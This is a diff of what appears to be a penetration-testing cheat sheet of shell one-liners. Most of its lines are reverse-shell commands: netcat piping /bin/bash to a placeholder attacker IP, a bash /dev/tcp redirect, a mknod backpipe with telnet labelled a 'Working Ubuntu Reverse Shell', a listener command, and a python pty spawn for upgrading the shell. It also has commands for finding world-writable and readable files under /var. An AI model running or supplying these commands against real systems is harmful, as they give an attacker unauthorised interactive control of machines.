@@ -13,9 +13,7 @@ find /var/ -type f -perm -o=w
 #find log files you can read
 find /var/log/ -type f -perm -o=r
 
-#Reverse Shell Interaction with NetCat
-
-#When shelled in to the remote host, simply issue the following command to send the shell back home:
+#Reverse Shell with NetCat
 nc -c /bin/bash <myip> 1234
 
 #Unix-ish nc that does support the -c flag
@@ -25,15 +23,19 @@ nc -c /bin/bash <myip> 1234
 /bin/bash | nc <myip> 1234
 
 #Then listen for the shell:
-nc -l -p 1234 -vvv
+nc -nvlp 1234
 
 #Reverse Shell w/o NetCat
-
 /bin/bash -i > /dev/tcp/myip/1234 0<&1 2>&1
 
-#OR
 
-mknod backpipe P && telnet myip 1234 0<backpipe | /bin/bash 1>backpipe
+#Working Ubuntu Reverse Shell
+#note that you don't need to include mknod backpipe p if you have already created it
+#if it already exists, it will probably fail to throw the shell
+mknod backpipe p && telnet myip 1234 0<backpipe | /bin/bash 1>backpipe
+
+#get a tty from within a reverse shell
+python -c 'import pty; pty.spawn("/bin/sh")'
 
 #even crazier
 #listen on port 1234 and 12345
